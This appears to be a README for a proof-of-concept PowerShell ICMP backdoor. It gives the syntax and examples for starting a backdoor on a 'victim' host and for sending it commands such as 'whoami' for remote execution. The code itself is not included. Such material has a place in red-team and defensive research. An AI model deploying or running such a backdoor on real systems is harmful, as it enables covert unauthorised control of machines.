<h1>ICMP-Backdoor</h1>
ICMP-Backdoor is a proof of concept PowerShell script that allows you to create and interact with a simple ICMP Backdoor.  This should not be used as is in an engagement as no security is enforced and anyone with this script can interact with your backdoors.
<br/><br/>
ICMP-Backdoor client and server require elevated privileges in order to create raw sockets.
<br/>
<h2>Usage</h2>
<h3>Starting a Backdoor on a Victim</h3>
<h4>Syntax</h4>
<ul><li>
Invoke-ICMPBackdoor [[-BindIP] &lt;String&gt;] [&lt;CommonParameters&gt;]
</li>
</ul>
<h4>Example</h4>
<ul>
<li>
Invoke-ICMPBackdoor -BindIP 192.168.1.1
<ul><li>This command starts an ICMP backdoor that will be bound to the specified IP address, 192.168.1.1.</li></ul>
</ul>
<h3>Sending a Command to a Backdoor</h3>
<h4>Syntax</h4>
<ul><li>
Send-ICMPCommand [-ServerIP] &lt;String&gt; [[-BindIP] &lt;String&gt;] [-Command] &lt;String&gt; [&lt;CommonParameters&gt;]
</li>
</ul>
<h4>Example</h4>
<ul>
<li>
Send-ICMPCommand -BindIP 192.168.1.2 -ServerIP 192.168.1.1 -Command whoami
<ul><li>This command connects to the ICMP Backdoor on 192.168.1.1 and sends the command "whoami" to the remote system for execution.  Results will be returned as a string to the BindIP address, which must be a valid IP address on the system sending the command.</li></ul>
</ul>
<br/>
